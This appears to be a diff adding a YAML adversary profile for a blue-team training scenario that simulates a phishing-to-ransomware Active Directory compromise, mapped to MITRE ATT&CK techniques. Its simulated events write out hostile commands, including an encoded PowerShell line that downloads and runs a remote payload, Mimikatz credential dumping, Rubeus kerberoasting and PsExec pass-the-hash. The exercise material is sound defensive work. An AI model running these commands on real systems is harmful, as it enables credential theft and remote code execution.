@@ -1,0 +1,116 @@
+# ============================================
+# WazuhBOTS — CALDERA Adversary Profile
+# Scenario 2: Operation Iron Gate
+# Active Directory Compromise + Ransomware
+# ============================================
+
+id: wazuhbots-iron-gate
+name: "Operation Iron Gate"
+description: |
+  Simulates a phishing-initiated Active Directory compromise.
+  Kill chain: Phishing → Macro Execution → Credential Dump →
+  Kerberoasting → Lateral Movement → Ransomware
+
+atomic_ordering:
+  # Phase 1: Initial Access - Spearphishing
+  - technique: T1566.001
+    name: "Phishing: Spearphishing Attachment"
+    description: "Simulated phishing email delivered to target user"
+    simulated_event:
+      email_from: "hr-benefits@corpnet-updates.com"
+      email_to: "jdoe@corpnet.local"
+      subject: "Q1 Benefits Update - Action Required"
+      attachment: "Q1_Benefits_2026.xlsm"
+      delivery_status: "delivered"
+    delay_seconds: 0
+
+  # Phase 2: Execution - Macro
+  - technique: T1059.001
+    name: "PowerShell Execution via Macro"
+    description: "VBA macro executes encoded PowerShell downloader"
+    simulated_event:
+      parent_process: "WINWORD.EXE"
+      child_process: "powershell.exe"
+      command_line: "powershell -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADUALgAwAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkACcAKQA="
+      user: "CORPNET\\jdoe"
+      workstation: "WS-FINANCE01"
+    delay_seconds: 30
+
+  # Phase 3: Credential Access - LSASS Dump
+  - technique: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+    description: "Mimikatz credential harvesting"
+    simulated_event:
+      process: "mimikatz.exe"
+      command_line: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
+      target_process: "lsass.exe"
+      credentials_found:
+        - user: "administrator"
+          domain: "CORPNET"
+          ntlm_hash: "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+        - user: "svc_sql"
+          domain: "CORPNET"
+          ntlm_hash: "aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a224a3b108f3fa6cb6d"
+    delay_seconds: 45
+
+  # Phase 4: Credential Access - Kerberoasting
+  - technique: T1558.003
+    name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+    description: "Request TGS tickets for service accounts"
+    simulated_event:
+      tool: "Rubeus.exe"
+      command_line: "Rubeus.exe kerberoast /nowrap"
+      target_spns:
+        - "MSSQLSvc/sql01.corpnet.local:1433"
+        - "HTTP/web01.corpnet.local"
+      event_ids: [4769]
+      encryption_type: "0x17"
+    delay_seconds: 30
+
+  # Phase 5: Lateral Movement
+  - technique: T1021.002
+    name: "Remote Services: SMB/Windows Admin Shares"
+    description: "PSExec lateral movement to other hosts"
+    simulated_event:
+      tool: "PsExec.exe"
+      source: "WS-FINANCE01"
+      targets: ["WS-HR02", "WS-DEV03"]
+      command: "cmd.exe /c whoami & ipconfig"
+      auth_method: "pass-the-hash"
+    delay_seconds: 60
+
+  # Phase 6: Impact - Ransomware
+  - technique: T1486
+    name: "Data Encrypted for Impact"
+    description: "Ransomware deployment across compromised hosts"
+    simulated_event:
+      binary: "update_service.exe"
+      sha256: "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
+      extensions_targeted: [".docx", ".xlsx", ".pdf", ".sql", ".bak"]
+      ransom_note: "ALL_FILES_ENCRYPTED.txt"
+      encrypted_count: 1547
+      bitcoin_address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+    delay_seconds: 120
+
+target_hosts:
+  - hostname: dc-srv (DC01.CORPNET.LOCAL)
+    ip: 172.25.0.32
+  - hostname: WS-FINANCE01
+    ip: 172.25.0.40
+  - hostname: WS-HR02
+    ip: 172.25.0.41
+
+mitre_coverage:
+  tactics:
+    - Initial Access
+    - Execution
+    - Credential Access
+    - Lateral Movement
+    - Impact
+  techniques:
+    - T1566.001
+    - T1059.001
+    - T1003.001
+    - T1558.003
+    - T1021.002
+    - T1486
